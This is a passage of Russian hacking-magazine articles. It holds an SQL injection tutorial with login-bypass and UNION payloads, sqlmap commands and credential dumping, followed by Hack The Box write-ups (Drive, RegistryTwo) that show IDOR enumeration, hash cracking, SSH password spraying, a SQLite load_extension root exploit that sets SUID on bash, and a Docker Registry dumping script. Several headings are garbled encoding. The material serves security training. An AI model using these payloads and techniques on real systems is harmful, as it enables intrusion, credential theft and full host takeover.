  Нам нужно добавить что-то, кроме кавычки, чтобы пос ледующая часть зап-
роса прос то не сработала. Про ще всего в этом случае исполь зовать ком-
менти рование. В MySQL комментарии отбиваются двумя черточка ми (--).
Все иду щие дальше сим волы будет считать ся комментарием, а не частью
коман ды.
   Чтобы учесть все возможные случаи, полезно добавлять к двум черточкам
про бел и еще какой-нибудь символ (я ставлю еще один прочерк: -- -). Так
мы удостоверим ся, что ни при каких усло виях не получится пустой коммента-
рий, ведь такое во многих реали зациях SQL недопустимо.




                   В разных БД синтаксис комментирова ния может
                       различаться.


Вот как в итоге будет выг лядеть рабочая наг рузка в форме ввода.





А вот она же в коде после под становки:


SELECT * FROM users WHERE username = '' -- -' AND password =
'$user_input_password'"

Проверка пароля больше не производится — это условие теперь часть ком-
мента рия. Но нам все еще требуется имя пользователя, а его мы можем и не
знать. Нельзя ли снять и это усло вие тоже?
  Давай взглянем на код еще раз. Мы видим, что провер ка происходит
по количеству строк в ответе от базы данных. Если совпадений нет, воз вра-
щает ся ноль строк. Значит, нам надо сделать так, чтобы этих строк было
не ноль. Как насчет того, чтобы вывести в ответ сразу все строки из БД?
Для этого нужно соз дать усло вие, которое будет истинно для каждой строки.
И сделать это прос то — достаточно добавить or 1=1.





В коде после под становки значения это будет выглядеть вот так:


SELECT * FROM users WHERE username = '' or 1=1 -- - ' AND password =
'$user_input_password'"

На русском наш запрос можно прочесть так: «Выбери все строки из базы
данных users, где имя поль зователя пустое ИЛИ единица, равная единице».
А пос коль ку еди ница всегда рав на еди нице, это усло вие будет соблюдаться
для каждой стро ки.
  Ре зультат — мы в админке!





                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ



          РАЗБИРАЕМ НА ПАЛЬЦАХ ОДНУ
              ИЗ САМЫХ ПОПУЛЯРНЫХ
                    ХАКЕРСКИХ ТЕХНИК





UNION-BASED SQLI

Однако Васька не интересует содержимое админки, цены на гантели он
может пос мотреть и на сай те. Его цель — таб лица с име нами пользовате лей
и пароля ми. И они ведь наверняка хранятся в той же базе данных!
   Как мы уже знаем, в интернет-магазине есть поиск. Пред положим, что
в коде сайта исполь зуется вот такой запрос:


SELECT * FROM `products` WHERE category = '$query'

Давай разберем его подробнее:
 • SELECT означает, что мы собираемся выбирать строки из таблицы;
 • * FROM products означает, что мы выбира ем все стол бцы из таблицы
  products;
 • WHERE category = '$query' — что мы будем извлекать стро ки, где
   значение в столбце category рав но переменной $query, которую мы
  можем модифи циро вать.

Мы можем про вернуть здесь тот же трюк, который мы уже при меня ли
при взло ме админки. Поп робуем отправить кавычку и помет ку коммента рия.
Должен получиться вот такой запрос:


http://just_usual_site_with_sqli.com/tovar?id=''-- -

В виде SQL это будет выглядеть так:


SELECT * FROM 'products' WHERE category = '' -- -'

Это нам пока что ничего не даст — сайт прос то поищет товары с пустым
иден тификатором. Что бы вытащить данные из другой таблицы, нам надо
использовать волшебное сло во UNION. Оно поз воляет объединить два зап-
роса в один. То есть мы как бы подцепимся к заложенному в программу зап-
росу и сде лаем свой зап рос.
  Но есть боль шая проб лема — мы ведь ничего не знаем о структуре базы
данных! Делать запросы вслепую? На угадывание в таком случае уйдет уйма
вре мени.
  Поэто му обычно сначала проводят небольшую раз ведку, что бы понять,
какие есть таб лицы и какие в них столбцы. А затем уже мож но извле кать
из них дан ные.
   Вот общий алгоритм действий при проведении атаки UNION-based SQLi (а
именно ее и планиру ет реали зовать наш Васёк):
 1. Определяем число стол бцов в таб лице.
 2. Узнаём вер сию базы данных.
 3. Вы водим список баз данных.
 4. Вы водим список таблиц в базе данных.
 5. Вы водим список столбцов в таблице.
 6. Вы водим информацию из нужных столбцов.

Давай посмотрим под робнее, как делается каждое из этих действий.


Îïðåäåëÿåì ÷èñëî ñòîëáöîâ â òàáëèöå
Зап росим столбец номер 1:


http://just_usual_site_with_sqli.com/tovar?id=' UNION SELECT 1 -- -

Это породит вот такой зап рос в коде:


SELECT * FROM 'products' WHERE category = '' UNION SELECT 1 -- -'

В ответ видим сообщение об ошиб ке, посколь ку в таблице боль ше одного
столбца и база ждет, что мы зададим, как отображать их все. Давай добав-
лять номера по порядку, пока ошибка не исчезнет.
   Вот финаль ный зап рос:


http://just_usual_site_with_sqli.com/tovar?id=' UNION SELECT 1,2,3,4
-- -

Ошибок нет, зна чит, в таб лице четыре столбца.


Óçíàёì âåðñèþ ÁÄ
Те перь нужно опре делить тип и версию базы данных. Нужно будет под бирать
коман ды для разных СУБД, пока зап рос вер сии не сра ботает без ошибки.
Но мы сразу предположим, что у нас самый популярный вари ант — MySQL:


http://just_usual_site_with_sqli.com/tovar?id=' UNION SELECT 1,
@@version ,3,4 -- -

В виде SQL:


SELECT * FROM 'products' WHERE category = '' UNION SELECT 1,@@version
,3,4 -- -'




                     Для каждой разновидности СУБД команда будет
                       сво ей. Что бы нор мально определить базу данных,
                      рекомендую использовать шпаргалку на сайте
                         PortSwigger.



Âûâîäèì ñïèñîê áàç äàííûõ
Когда мы определи ли тип базы данных и версию, можно переходить к более
сложным зап росам. Например, нелишне будет узнать структуру базы данных,
то есть ее «схе му».
  Ты спросишь, что это за схе ма такая? В каждой СУБД, основанной на SQL,
есть спе циальная база, в которой содержится перечень других баз, их таблиц
и стол бцов, а также прочая сопутству ющая информация. Называется эта база
INFORMATION_SCHEMA. В ней есть таблица SCHEMATA, содер жащая список баз
данных. Их названия мы можем узнать из столбца schema_name.
  Зап рашиваем содержимое столбцов SCHEMATA:


SELECT * FROM 'products' WHERE category = ''
UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -'

Следующие шаги будем делать, отталкиваясь от этого зап роса.


Âûâîäèì ñïèñîê òàáëèö â áàçå äàííûõ
Дальше предположим, что мы нашли базу данных users и горим желанием
узнать ее содержимое. Давай для начала выведем всю информацию о таб-
лицах в этой базе данных. В этом нам поможет информа ция из таблицы
TABLES все той же базы INFORMATION_SCHEMA:


SELECT * FROM 'products' WHERE category = ''
UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.
TABLES
WHERE table_schema='users'-- -'

Что добави лось нового? Появи лось поле table_name — это названия таб лиц,
важ ная для нас информа ция. Также я рекомендую  оставлять стол бец
table_schema, что бы рядом помечалось, из какой базы данных взя та таб-
лица. И еще добавилось усло вие WHERE table_schema='users'. WHERE отсе-
кает ненуж ный вывод и отоб ражает только наз вания таблиц из заданной
базы, в данном слу чае users.


Âûâîäèì ñïèñîê ñòîëáöîâ â òàáëèöå
Предположим, в базе данных users мы нашли таб лицу с говорящим названи-
ем credentials, то есть учетные данные. Хорошо бы заполучить эту таблицу,
но для это го надо бы знать, какие в ней есть столбцы.
  Давай отправим вот такой зап рос:


SELECT * FROM 'products' WHERE category = ''
UNION select 1,COLUMN_NAME,TABLE_NAME,4 from INFORMATION_SCHEMA.
COLUMNS
WHERE table_name='credentials'-- -'

Всё точ но так же, как на прошлом шаге, но теперь мы выбираем из таблицы
COLUMNS базы INFORMATION_SCHEMA названия колонок  (COLUMN_NAME) таб-
лицы с учетными данными (credentials).


Âûâîäèì èíôîðìàöèþ èç íóæíûõ ñòîëáöîâ
Предположим, на прош лом этапе мы узнали, что в таблице credentials есть
столбцы username и password. Давай наконец получим их содержимое
из таб лицы credentials базы данных users:


SELECT * FROM 'products' WHERE category = ''
UNION select 1, username, password, 4 from users.credentials-- -'

Впечатлен тем, сколько тру да при ложил Васёк для своей немотивированной
ата ки на несчастный интернет-магазин? Как бы не так! Наш Васька прос то
запустил «мапу» и был таков.


SQLMAP

Спро сишь, что за «мапа» такая? Речь о зна мени том инструменте sqlmap,
который пол ностью авто матизирует все дей ствия, что мы разбирали выше,
и делает многое-мно гое другое. Давай посмотрим, как с ним работать.
  Для начала запросим справку:


sqlmap -hh

И уви дим огромнейший вывод. Выучивать его весь необя зательно, важно
запом нить несколько самых важ ных параметров:
 • -u — адрес тес тируемо го сай та, где мы наш ли уяз вимость. В ссылке обя-
   зательно дол жен быть параметр, куда будет подставляться строка: -u
  "http://just_usual_site_with_sqli.com/tovar?id=";
 • -a (--all) — выводит всю информацию из БД;
 • --dbs — выводит все базы данных из БД;
 • --tables — выводит все таб лицы;
 • --columns — выводит все стол бцы;
 • --dump — дампит (копирует) вывод из БД, ну или же вывод по заданным
   параметрам;
 • -D — из какой базы данных выводить данные;
 • -T — из какой таблицы выводить данные;
 • -С — из какой колонки выводить дан ные;
 • --level — отвечает за то, нас колько глубоким будет тест уязвимости,
   мак симум может быть 5-го уровня;
 • --risk – опре деляет риск уязвимости; чем он выше, тем веро ятнее, что
   sqlmap что-то обнаружит. Но повышается шанс  того, что нас могут
   задетектить, аналогичная ситуация и с --level.

Давай посмотрим, что написал в тер минале хитрый Васёк вместо всей руч ной
работы, про деланной нами выше:


sqlmap -u "http://just_usual_site_with_sqli.com/tovar?id=" -all
--level= 5 --risk= 3

Всё, дальше Васян потягивает пиво, а sqlmap тру дится.
  Но что, если попадет ся POST-зап рос, а не GET? Помнишь, в начале статьи
я приводил скриншот с перех ваченным запросом?





Берем его целиком (да, прямо весь) и встав ляем в текстовый файл с рас-
ширением .req. Назовем, к при меру, sqli.req. Теперь запус каем sqlmap
с параметром -r и указываем этот файл:


sqlmap -r sqli.req --all --level= 5 --risk= 3

Всё, «мапа» начала трудить ся.


SQLI Â ÄÈÊÎÉ ÏÐÈÐÎÄÅ

Ес ли бы такой простой, доступный и широко известный баг встре чался
в реальной жизни, то сайты бы, наверное, ломали каждый день. Собственно,
при мерно так оно и было на заре интерне та. Однако с тех пор раз работчики
ста ли намного осто рожнее, а в популярные веб-фрей мвор ки, на основе
которых делают сай ты, уже встроены автомати чес кие провер ки на SQLi.
Никакая шальная кавыч ка не пройдет!





       По пулярный комикс XKCD обыг рыва ет тему SQL-инъекций

Тем не менее проверять наличие SQLi при пен тестах обязатель но нужно.
Никогда нельзя исклю чать забывчивость или неопытность разработ чика.
Вдруг он таки ухитрился обработать зап рос в обход встроенных фильтров?
Или, к примеру, дви жок сайта не обновляли с 1887 года. Или ты перебором
путей нашел какую-нибудь скры тую страничку, которую реализовали по-прос-
тому, в надежде, что на нее никто никогда не забредет. В общем, случается
всякое, а проверить нетяжело.


ÃÄÅ ÏÐÀÊÒÈÊÎÂÀÒÜÑß?

Ни какие объясне ния не заменят личного опы та. Только попробовав на проч-
ность пару-тройку сай тов, ты по-нас тоящему осво ишься и будешь готов вос-
при нимать вещи, которые мы разберем в следующий раз.
  Я рекомендую пройти пару тренировочных заданий. Например, модуль
HTB Academy, пос вященный SQLi, или ана логичный модуль на площадке
TryHackMe. А еще лучше — оба!
  Затем можешь заглянуть на сайт PortSwigger и пройти «путь» SQL injection.
Сра зу пре дуп реждаю, что он слож ный и даже очень сложный для новичка,
но там везде приведе ны ответы. Лучше в них не смотреть сразу, но, если
вдруг застрянешь, они выручат.
  Еще могу порекомендовать две очень интересные лабораторные работы
с площадки Hack The Box: PC и Magic или хотя бы те их час ти, что связаны
с атаками на веб и получением пользовательского флага (повыше ние при-
вилегий в Linux можешь пока не тро гать). Опять же, если застря нешь, под гля-
дывай в прохождение: райтап по PC есть на «Хакере», прохождение Magic —
в бло ге 0xdf.
  Напоследок желаю тебе не сда ваться! Иногда понимание требует нес-
кольких подходов, и это нормально. Практикуй ся, и всё обязательно получит-
ся.
  В сле дующий раз мы разберем слепые SQL-инъ екции, инъ екции, осно-
ванные на ошиб ках, а также time-based-атаки.
ВЗЛОМ





В этом райтапе я покажу, как провес ти ата-
ку на базу данных SQLite при помощи собс-
твенного загружа емо го модуля. Но сначала
получим доступ к приватным данным через
уязвимость IDOR и захватим учетку поль-             RalfHacker                                                                                             hackerralf8@gmail.com
зователя.


Наша цель — получение прав рута на машине Drive с учебной площадки Hack
The Box. Уровень машины обозначен как слож ный.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.235   drive.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Сканер нашел два открытых порта:
 • 22 — служба OpenSSH 8.2p1;
 • 80 — веб-сервер Nginx 1.18.0.

Мы, как всег да, начина ем с проверки сайта, пос кольку учетных данных от SSH
у нас пока нет.





                        Главная стра ница сай та


ÒÎ×ÊÀ ÂÕÎÄÀ

На странице Home есть файл, который в дан ный момент недоступен.





                       Дос тупные фай лы

Зато на сайте можно зарегистри ровать ся и авто ризо ваться. Сделаем это,
чтобы получить дос туп к большему числу функций.





            Главная стра ница авто ризо ванного пользователя

Пос ле авто ризации появилась воз можность загружать файлы на сер вер.





                   Фор ма заг рузки файлов

Пот ратив значительное время на попытки заг рузить шелл, я не смог добить ся
результатов. Най денный файл ничего полезного не содержит.





                     Содержимое фай ла

Однако пос ле загрузки собственного файла появляется интересная зацепка.
Обрати внимание на путь к странице — /120/getFileDetail/. При этом путь
к фай лу админа — /100/getFileDetail/.





                    Резуль тат загрузки файла

Можно перебрать все номера и, возможно, получить доступ к файлам дру гих
поль зовате лей (если не реализова на сис тема контро ля доступа).
  Перенап равим запрос из Burp Proxy в Burp Intruder и укажем место
перебо ра.





                    Burp Intruder — вкладка Positions

На вкладке  Payloads нужно  установить тип Numbers и  указать номера
с 1 до 1000 с шагом 1.





                    Burp Intruder — вкладка Payloads

Пос ле запуска атаки сортируем результаты по коду ответа и замеча ем нес-
колько документов, которые возвращают ошибку 401.





                       Результат перебора

Значит, контроль доступа к фай лам все же при сутству ет.





                        Ответ сервера


ÒÎ×ÊÀ ÎÏÎÐÛ

В списке  заг ружен ных файлов есть еще одна интерес ная функция —
зарезервировать файл.





                   Список заг руженных фай лов

Ес ли кликнуть по ссылке Reserve, нас редирек тит на дру гую страницу — /125/
block/.





                  Стра ница редактирования фай ла

Сно ва переби раем файлы тем же способом. На странице block контроля
доступа может и не быть.





                    Burp Intruder — вкладка Positions





                       Результат перебора

Фильтруем результат по коду ответа и видим те же страницы, что и раньше,
однако теперь вмес то кода ответа 401 получаем 200. Значит, мы можем
прос матри вать файлы других поль зователей.





                     Ответ сервера в Render

Открываем  найденные  стра ницы  через  бра узер  и ищем  инте ресную
информацию в фай лах. В одном из фай лов находим пароль, а в другом —
сообщение об устранении оши бок безопасности.





                    Содержимое файла 79





                    Содержимое файла 99

С полученным паролем авторизу емся по SSH от имени пользовате ля martin.





                   Сессия поль зователя martin




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ



       ПОВЫШАЕМ ПРИВИЛЕГИИ ЧЕРЕЗ
         СОБСТВЕННЫЙ МОДУЛЬ SQLITE





ÏÐÎÄÂÈÆÅÍÈÅ

Те перь нам необходимо собрать информацию. Я буду использовать для это-
го скрип ты PEASS.




Что делать после того, как мы получи ли доступ в систему от имени поль-
зователя? Вари антов дальнейшей эксплуата ции и повышения при виле гий
может быть очень мно го, как в Linux, так и в Windows. Чтобы соб рать
информацию и наметить цели, мож но исполь зовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скрип тов, которые проверяют сис-
тему на автомате и выдают подробный отчет о потенциально интерес ных
файлах, про цессах и настрой ках.


Заг рузим на хост скрипт для Linux, дадим пра во на выполнение и запустим
сканиро вание. Затем посмотрим, что инте ресного нашел сканер.
  В списке прослушиваемых портов — типич ные для службы MySQL пор-
ты 3306 и 3000.





                     Прос лушиваемые порты

Есть много пользовате лей, от имени которых можно авторизовать ся.





                     Поль зователи с кон солью

В катало ге /var/www/backups — несколько бэкапов базы данных SQLite.





                       Най денные бэкапы

Скачиваем обнаруженные бэкапы на свой хост. Архи вы открыть не получится,
так  как они все защище ны паролем,  зато откроем файл db.sqlite3
с помощью DB Browser.





                       Таб лицы в базе дан ных

В таблице accounts_customuser хранит ся информация о пользователях,
в том чис ле и хеши их паролей.





            Содержимое таб лицы accounts_customuser

Сохраняем хеши в файл для брутфорса с помощью знаменитой утилиты
hashcat. Однако этой утилите нужно указать тип хеша в параметре -m. Узнать
соот ветствующий режим можно, распарсив справку hashcat.


hashcat --example | grep 'sha1\$' -B12 -A1





                         Справка hashcat

По лучаем информацию о хеше и его типе (Hash mode). Теперь собранные
хеши мож но отправить на перебор по словарю rockyou.txt.


hashcat -m 124 hashes.txt rockyou.txt





                      Результат взло ма хеша

Из всех хешей поддался взло му только один. Его я решил сразу поспреить
по всем пользователям на SSH с помощью CrackMapExec.


crackmapexec ssh drive.htb -u users.txt -p john316

Однако пароль не подошел ни к одному из логинов.





                     Спрей паролей на SSH

Пробуем найти дру гой путь, к при меру через сер вис на локальном пор-
те 3000. Но сначала этот порт нужно проб росить до нашей машины.


ssh martin@drive.htb -L 3000:127.0.0.1:3000

Те перь весь трафик, который мы пошлем на локаль ный порт 3000, будет тун-
нелиро ван на порт 3000 указанного хоста (в данном слу чае 127.0.0.1) через
SSH-хост. Заходим через браузер и обнаружи ваем сервис Gitea.





                        Главная стра ница Gitea

Этот сер вис позволя ет без регистрации просмотреть публичные репози-
тории и пользователей.





                   Список пользователей Gitea

Там есть знакомый нам юзер martin, от имени которо го мы успешно авто-
ризуемся. Теперь нам доступен репозиторий DoodleGrive поль зователя
cris.





                    Дос тупные репози тории





                       Страница репозитория

У репози тория пять коммитов, которые нужно вни матель но просмотреть.
В одном из них в скрипте db_backup.sh находим пароль, использованный
для шиф рования архи вов с бэкапами.





                   Исходный код db_backup.sh

Из вле каем из всех архивов базы, извлекаем из них новые пароли и отправ-
ляем на брут, как это делали в прош лый раз. Таким образом получаем
еще три новых пароля.


hashcat -m 124 hashes.txt rockyou.txt





                     Результат взлома хешей

Те перь есть несколь ко логинов и паролей, ком бинации которых нужно переб-
рать.


crackmapexec ssh drive.htb -u users.txt -p pass.txt





                  Результат брута поль зователей

Когда най дем валидную пару  учет ных дан ных,  авторизуемся на  хос те
и заберем пер вый флаг.





                       Флаг пользователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ

В домаш нем каталоге пользователя присутс твует приложение doodleGrive-
cli с установленным S-битом.





          Содер жимое домашнего каталога пользовате лей




Когда у файла установлен атрибут setuid (S-атрибут), обычный поль зователь,
запускающий этот файл, получает повышение прав до пользователя — вла-
дельца файла в рам ках запущенного процес са. Пос ле получения повышенных
прав при ложе ние может выполнять задачи, которые недоступны обычному
поль зовате лю. Из-за воз можнос ти сос тояния гонки многие операци онные
системы игнориру ют S-атрибут, уста новленный shell-скриптам.



То есть если мы най дем уязвимость в бинаре, то сможем пол ностью зах-
ватить сервер. Скачиваем файл на локальный хост через SSH для анализа.
Открываем в любом удобном дизас семблере с деком пилятором, я исполь зую
IDA Pro.


scp tom@drive.htb:~/doodleGrive-cli ./

При запуске файла считываем имя пользователя и пароль, пропус каем их
через функцию sanitize_string и срав нива ем со статически указанными
учетными данными (строка 28). Если введен ные учетные данные верны,
вызывается функция main_menu.





              Декомпилированный код функции main

Фун кция sanitize_string просто фильтрует символы, указанные в стро-
ке 14.





           Декомпилиро ван ный код фун кции sanitize_string

Фун кция main_menu предлагает поль зователю выб рать опцию. В данном слу-
чае инструкция в строке 31, ломающая код, представляет собой оператор
switch-case. Это становится понят но, если перейти от декомпилято ра
к дизассем блеру и акти вировать режим графа.





            Де ком пилированный код фун кции main_menu





                 Функция main_menu в виде графа

Фун кции в каж дом блоке мож но снова просматри вать в декомпиляторе. Пер-
вые   четыре    интереса   не   представляют,   а    вот   функцию
activate_user_account лучше изучить тщательнее.
   Эта  функция  запрашивает  имя  пользовате ля,  про пускает  через
sanitize_string, а потом использует в запросе к базе данных SQLite.





           Декомпилиро ван ный код фун кции sanitize_string

Так как никаких фильтров, кроме функции sanitize_string, не используется,
следующий зап рос уязвим к SQL-инъекции.


UPDATE accounts_customuser SET is_active=1 WHERE username="%s";

В данном случае есть возможность добить ся выпол нения кода в рам ках
запущенного процесса через загрузку собственного модуля SQLite. Сделать
это мы можем при помощи функции load_extension.
  Для это го на ско рую руку смастерим биб лиотеку, которая будет содержать
функцию с име нем sqlite3_NAME_init, где NAME — имя самой библиоте ки.
Код в нашей биб лиоте ке установит S-бит фай лу командной обо лочки /bin/
bash.


#include <stdlib.h>
#include <unistd.h>


void sqlite3_r_init() {
   setuid(0);
   setgid(0);
   system("/usr/bin/chmod +s /bin/bash");
}

Ском пилируем биб лиотеку и сохраним с именем r.


gcc -shared r.c -o r.so -nostartfiles -fPIC

Осталась еще  одна  сложная  часть —  внед рить  в  запрос  функцию
load_extension. Для  это го  сначала  закроем двойную  кавычку,  затем
вызовем целевую функцию с созданным модулем load_extension("./r")
и снова откро ем кавычки. Только функция sanitize_string отфильтрует
символ /, поэтому нам нужно избежать использования строки "./r". В этом
нам помогут воз можности базы SQLite: к примеру, можем собрать строку
из кодов символов.





                  Получение кодов сим волов

В ито ге для загрузки модуля через SQL-инъ екцию нуж но в качестве имени
поль зовате ля указать вот такую строку:


"+load_extension(char(46,47,114))+"





                     Экс плуата ция уяз вимости

При про верке файла /bin/bash видим уста новленный S-бит. А значит, мож но
запустить новый шелл от име ни рута.





                           Флаг рута

Машина захвачена!
ВЗЛОМ





В этом райтапе я покажу эксплуатацию нес-
кольких уязвимос тей в Java RMI, но сначала
про ведем ата ку на Docker Registry, которая
позволит нам получить дос туп к фай лам
сайта.                                                                              RalfHacker                                                                                             hackerralf8@gmail.com

Наша  цель —  зах ват  учет ной  записи  суперпользователя  на машине
RegistryTwo с учеб ной пло щадки Hack The Box. Уровень ее сложности —
«безумный».


ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.223    registrytwo.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Сканер нашел четыре открытых порта:
 • 22 — служба OpenSSH 7.6p1;
 • 443 — веб-сервер Nginx 1.14.0;
 • 5000 — сервис Docker Registry;
 • 5001 — сервис аутентификации Docker Registry.

В SSL-сертифика тах на веб-сервере нашлось несколько имен DNS, которые
мы тоже добавляем в файл /etc/hosts.


10.10.11.223 registrytwo.htb webhosting.htb www.webhosting.htb





               Глав ная страница сай та www.webhosting.htb




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ



          ЭКСПЛУАТИРУЕМ УЯЗВИМОСТИ
           JAVA RMI ДЛЯ ПОЛНОГО ЗАХВАТА
                             ХОСТА





ÒÎ×ÊÀ ÂÕÎÄÀ

Пе реходим к проверке Docker Registry и делаем запрос к API /v2/_catalog.


curl -k -s https://webhosting.htb:5000/v2/_catalog | jq





                        Ответ сервера

Выходит, нам нуж но аутентифици роваться на сервере. Поэтому обратим ся
к пор ту 5001 для получения токена.


curl -k -s https://webhosting.htb:5001/auth | jq





                   По лучение токена дос тупа

Проверяем полученный токен с помощью jwt_tool .


python3 jwt_tool.py eyJ0eXAiOiJKV1Q...





                    Ин формация о токене

Нас инте ресует поле access, так как оно содер жит текущие раз решения.
В дан ном случае оно пустое. Снова выпол ним зап рос к API, но прос мотрим
и HTTP-заголовки зап роса и ответа.


curl -k -s https://webhosting.htb:5000/v2/_catalog -v | jq





                        Ответ сервера

В заголов ке www-authenticate видим параметры, необходимые для запроса
токена. Запросим новый токен, учтя получен ные параметры.


curl -k -s 'https://webhosting.htb:5001/
auth?service=Docker%20registry&scope=registry:catalog:*' | jq





                      Получение токена


python3 jwt_tool.py eyJ0eXAiOiJKV1Q....





                    Ин формация о токене

В новом токене появи лись привилегии для доступа к каталогу. Теперь мы
можем передать этот токен в запросе к API и получить список репозитори ев.


curl -k -s https://webhosting.htb:5000/v2/_catalog -H
'Authorization: Bearer eyJ0eXAi...' | jq





                     Спи сок репози тори ев

Для  автомати зации  работы  с  репози ториями  можно  исполь зовать
DockerRegistryGrabber. Но  есть проб лема:  скрипт принимает  логин
и пароль для авто ризации на сервере, а мы зна ем только токен. Поэтому я
немного модифициро вал скрипт, что бы он в качестве учетных данных при-
нимал токен дос тупа.


#!/usr/bin/env python3


import requests
import argparse
import re
import json
import sys
import os
from base64 import b64encode
import urllib3
from rich.console import Console
from rich.theme import Theme
from requests.packages.urllib3.exceptions import
InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
req = requests.Session()


http_proxy = ""
os.environ['HTTP_PROXY'] = http_proxy
os.environ['HTTPS_PROXY'] = http_proxy



custom_theme = Theme({
   "OK": "bright_green",
   "NOK": "red3"
})


def manageArgs():
   parser = argparse.ArgumentParser()
   parser.add_argument("url", help="URL")
   parser.add_argument("-p", dest='port', metavar='port', type=int,
default=5000, help="port to use (default : 5000)")
   auth = parser.add_argument_group("Authentication")
   auth.add_argument('-T', dest='token', type=str, default="", help=
'Token')


   action = parser.add_mutually_exclusive_group()
   action.add_argument("--dump", metavar="DOCKERNAME", dest='dump',
type=str,  help="DockerName")
   action.add_argument("--list", dest='list', action="store_true")
   action.add_argument("--dump_all",dest='dump_all',action=
"store_true")
   args = parser.parse_args()
   return args


def printList(dockerlist):
   for element in dockerlist:
       if element:
           console.print(f"[+] {element}", style="OK")
       else:
           console.print(f"[-] No Docker found", style="NOK")


def tryReq(url, token=None):
   try:
       if token:
           r = req.get(url,verify=False, headers={'Authorization':
'Bearer ' + token})
           r.raise_for_status()
       else:
           r = req.get(url,verify=False)
           r.raise_for_status()
   except requests.exceptions.HTTPError as errh:
       console.print(f"Http Error: {errh}", style="NOK")
       sys.exit(1)
   except requests.exceptions.ConnectionError as errc:
       console.print(f"Error Connecting : {errc}", style="NOK")
       sys.exit(1)
   except requests.exceptions.Timeout as errt:
       console.print(f"Timeout Error : {errt}", style="NOK")
       sys.exit(1)
   except requests.exceptions.RequestException as err:
       console.print(f"Dunno what happend but something fucked up {
err}", style="NOK")
       sys.exit(1)
   return r


def createDir(directoryName):
   if not os.path.exists(directoryName):
       os.makedirs(directoryName)


def downloadSha(url, port, docker, sha256, token=None):
   createDir(docker)
   directory = f"./{docker}/"
   for sha in sha256:
       filenamesha = f"{sha}.tar.gz"
       geturl = f"{url}:{str(port)}/v2/{docker}/blobs/sha256:{sha}"
       r = tryReq(geturl,token)
       if r.status_code == 200:
           console.print(f"    [+] Downloading : {sha}", style="OK")
           with open(directory+filenamesha, 'wb') as out:
               for bits in r.iter_content():
                   out.write(bits)


def getBlob(docker, url, port, token=None):
   tags = f"{url}:{str(port)}/v2/{docker}/tags/list"
   rr = tryReq(tags,token)
   data = rr.json()
   image = data["tags"][0]
   url = f"{url}:{str(port)}/v2/{docker}/manifests/"+image+""
   r = tryReq(url,token)
   blobSum = []
   if r.status_code == 200:
       regex = re.compile('blobSum')
       for aa in r.text.splitlines():
           match = regex.search(aa)
           if match:
               blobSum.append(aa)
       if not blobSum :
           console.print(f"[-] No blobSum found", style="NOK")
           sys.exit(1)
       else :
           sha256 = []
           cpt = 1
           for sha in blobSum:
               console.print(f"[+] BlobSum found {cpt}", end='\r',
style="OK")
               cpt += 1
               a = re.split(':|,',sha)
               sha256.append(a[2].strip("""))
           print()
           return sha256


def enumList(url, port, token=None,checklist=None):
   url = f"{url}:{str(port)}/v2/_catalog"
   try :
       r = tryReq(url,token)
       if r.status_code == 200:
           catalog2 = re.split(':|,|\n ',r.text)
           catalog3 = []
           for docker in catalog2:
               dockername = docker.strip("['"\n]}{")
               catalog3.append(dockername)
       printList(catalog3[1:])
       return catalog3
   except:
       exit()


def dump(args):
   sha256 = getBlob(args.dump, args.url, args.port, args.token)
   console.print(f"[+] Dumping {args.dump}", style="OK")
   downloadSha(args.url, args.port, args.dump, sha256, args.token)


def dumpAll(args):
   dockerlist = enumList(args.url, args.port, args.token)
   for docker in dockerlist[1:]:
       sha256 = getBlob(docker, args.url, args.port, args.token)
       console.print(f"[+] Dumping {docker}", style="OK")
       downloadSha(args.url, args.port,docker,sha256,args.token)


def options():
   args = manageArgs()
   if args.list:
       enumList(args.url, args.port,args.token)
   elif args.dump_all:
       dumpAll(args)
   elif args.dump:
       dump(args)


if __name__ == '__main__':
   print(f"[+]======================================================[
+]")
   print(f"[|]    Docker Registry Grabber v1       @SyzikSecu       [
|]")
   print(f"[+]======================================================[
+]")
   print()
   urllib3.disable_warnings()
   console = Console(theme=custom_theme)
   options()

Токен передаем в параметре -T, а для проверки получим список репози тори-
ев. В этом нам поможет параметр --list.


